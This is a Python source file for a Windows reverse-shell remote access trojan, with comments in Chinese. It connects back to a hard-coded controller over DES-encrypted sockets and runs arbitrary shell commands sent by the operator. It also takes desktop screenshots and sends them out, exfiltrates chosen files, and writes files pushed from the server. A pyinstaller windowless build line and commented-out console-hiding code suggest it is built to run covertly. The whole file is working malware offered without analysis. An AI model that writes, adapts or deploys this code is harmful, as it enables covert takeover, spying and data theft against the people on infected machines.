#-*- coding : gbk -*-
# coding: gbk
from subprocess import Popen,PIPE,STDOUT
from time import sleep
from socket import socket,AF_INET,SOCK_STREAM,gethostname
from threading import Thread
from pyautogui import screenshot
from pyDes import des
from os import stat,getenv,remove
from os.path import exists
#pyinstaller -F -w pys-c01.1.py
#加解密
def encrypt(text):
    cryptor = des(b"qsdV%^Gb", IV=b"qsdV%^Gb")  # self.key的bytes长度是16的倍数即可， self.iv必须是16位
    length = 16
    count = len(text)
    if (count % length != 0):
        add = length - (count % length)
    else:
        add = 0
    text = text + ("\0".encode() * add)  # 这里的"\0"必须编码成bytes，不然无法和text拼接
    ciphertext = cryptor.encrypt(text)
    return ciphertext

def decrypt(text):
    cryptor = des(b"qsdV%^Gb", IV=b"qsdV%^Gb")
    plain_text = cryptor.decrypt(text).decode("gbk")
    return plain_text.rstrip("\0")  #有的博客上有这句，其实decode解码之后"\0"自动就没有了

#桌面截图
def takephoto(name):
    im = screenshot()
    filename=getenv("temp")+"\\{}".format(name)
    im.save(filename)
    return filename

#传文件
def sputfile(filepath):
    try:
        # 定义定义文件信息。128s表示文件名为128bytes长，l表示一个int或log文件类型，在此为文件大小
        # 定义文件头信息，包含文件名和文件大小
        # 将传输文件以二进制的形式分多次上传至服务器
        if exists(filepath):
            sock2.sendall(encrypt("Yes".encode('gbk')))
            sleep(1)
            fp = open(filepath, 'rb')
            data=fp.read()
            # while 1:
            #     data = fp.read(1024)
            #     if not data:
            #         # print('{0} file send over...'.format(ldata[1]))
            #         break
            sock2.send(encrypt(data))
            fp.close()
            return 1
        else:
            return 0
    except Exception as e:
        print(e)
        return 0
#收文件
def sgetfile(filepath):
    try:
        # 存储在该脚本所在目录下面
        filexists  = decrypt(sock2.recv(1024))
        if filexists=="No":
            sock2.sendall(encrypt("no".encode('gbk')))
            print("文件不存在！")
        else:
            sock2.sendall(encrypt("ok".encode('gbk')))
            fp = open('{}'.format(filepath), 'wb')
            # print('start receiving...')
            # 将分批次传输的二进制流依次写入到文件
            data = decrypt(sock2.recv(1024000))
            fp.write(data.encode('gbk'))
            fp.close()
            return 1
    except :
        return 0
#传文件
def putfile(filepath):
    try:
        # 定义定义文件信息。128s表示文件名为128bytes长，l表示一个int或log文件类型，在此为文件大小
        # 定义文件头信息，包含文件名和文件大小
        # 将传输文件以二进制的形式分多次上传至服务器
        if exists(filepath):
            size = stat(filepath).st_size
            sock2.sendall(encrypt(str(size).encode("gbk")))
            sleep(1)
            fp = open(filepath, 'rb')
            while 1:
                data = fp.read(1024)
                if not data:
                    # print('{0} file send over...'.format(ldata[1]))
                    break
                sock2.send(data)
            fp.close()
            return 1
        else:
            return 0
    except Exception as e:
        return 0
#收文件
def getfile(filepath):
    try:
        # 存储在该脚本所在目录下面
        filesize = decrypt(sock2.recv(1024))
        if filesize=="No":
            return 0
        else:
            fp = open('{}'.format(filepath), 'wb')
            recvd_size = 0  # 定义已接收文件的大小
            # print('start receiving...')
            # 将分批次传输的二进制流依次写入到文件
            while not recvd_size == int(filesize):
                if int(filesize) - recvd_size > 1024:
                    data = sock2.recv(1024)
                    recvd_size += len(data)
                else:
                    data = sock2.recv(int(filesize) - recvd_size)
                    recvd_size = int(filesize)
                fp.write(data)
            fp.close()
            return 1
    except :
        return 0
# #隐藏黑框
# def hideConsole():
#   whnd = windll.kernel32.GetConsoleWindow()
#   if whnd != 0:
#     windll.user32.ShowWindow(whnd, 0)
# hideConsole()

#正常命令执行
def rn(mod):
    pross=Popen('{}'.format(mod),shell=True,stdout=PIPE,stderr=STDOUT,encoding="gbk")
    # if pross.communicate(timeout=30):
    #     resturt="执行超时！！！"
    if pross:
        resturt=pross.stdout.read().encode("gbk")
        pross.stdout.close()
    else:
        resturt=pross.stderr.read().encode("gbk")
        pross.stderr.close()
    return resturt

#无返回命令执行，如python，或直接运行exe等
def rn2(args):
    Popen('{}'.format(args), shell=True, stdout=PIPE, stderr=STDOUT, encoding="gbk")

def listsize(m):
    if m==3:
        return True
    elif m==4:
        return True
    else:
        return False

if __name__ == '__main__':
    nonec=1
    while True:
        try:
            for i in range(5):
                try:
                    print("第{}次尝试回连".format(i))
                    # address_server = ('172.16.1.1', 62543)
                    # address_server = ('172.16.232.1', 62543)
                    address_server = ('127.0.0.1', 28089)
                    sock2 = socket(AF_INET, SOCK_STREAM)
                    sock2.connect(address_server)
                    a="kj#$!#@&*DZF555".encode("gbk")
                    sock2.sendall(encrypt(a))
                    # sock2.sendall("kj#$!#@&*DZF555".encode("gbk"))
                    sleep(1)
                    break
                except:
                    if i == 4:
                        print("超时！")
                        exit()
                    sleep(30)
            print("回连成功！")
            win_name = gethostname()
            sock2.sendall(encrypt(win_name.encode('gbk')))
            while True:
                data = decrypt(sock2.recv(10240000))
                ldata=list(data.split())
                #非交互执行命令
                if ldata[0]=="nrcv":
                    data=data.strip("nrcv ")
                    r1=Thread(target=rn2,kwargs={"args":"{}".format(data)})
                    r1.start()
                    sock2.sendall(encrypt("It is running,no data recv！".encode("gbk")))
                    continue
                #搞截屏
                elif ldata[0]=="tkphoto" and len(ldata)==3:
                    filepath = takephoto(ldata[1])
                    putfile(filepath)
                    remove(filepath)
                    continue
                #服务端请求客户端文件
                elif ldata[0]=="fget" and listsize(len(ldata)):
                    if ldata[1]=="-s" and len(ldata)==4:
                        if sputfile(ldata[2]):
                            continue
                        else:
                            sock2.sendall(encrypt("No".encode('gbk')))
                            continue
                    elif len(ldata)==3:
                        if putfile(ldata[1]):
                            continue
                        else:
                            sock2.sendall(encrypt("No".encode('gbk')))
                            continue
                    else:
                        continue
                #服务端传输客户端文件
                elif ldata[0] == "fput" and listsize(len(ldata)):
                    if ldata[1]=="-s" and len(ldata)==4:
                        sgetfile(ldata[3])
                        continue
                    elif len(ldata)==3:
                        getfile(ldata[2])
                        continue
                    else:
                        continue
                #正常操作执行命令
                else:
                    if 'quit' == data:
                        break
                    m = rn(str(data))
                    if m == b'':
                        sock2.sendall(encrypt("no data recv!".encode("gbk")))
                    try:sock2.sendall(encrypt(m))
                    except:sock2.sendall(encrypt("hava something wrong!".encode("gbk")))
            sock2.close()
            break
        except:
            if nonec>1:
                break
            else:
                nonec=nonec+1
                continue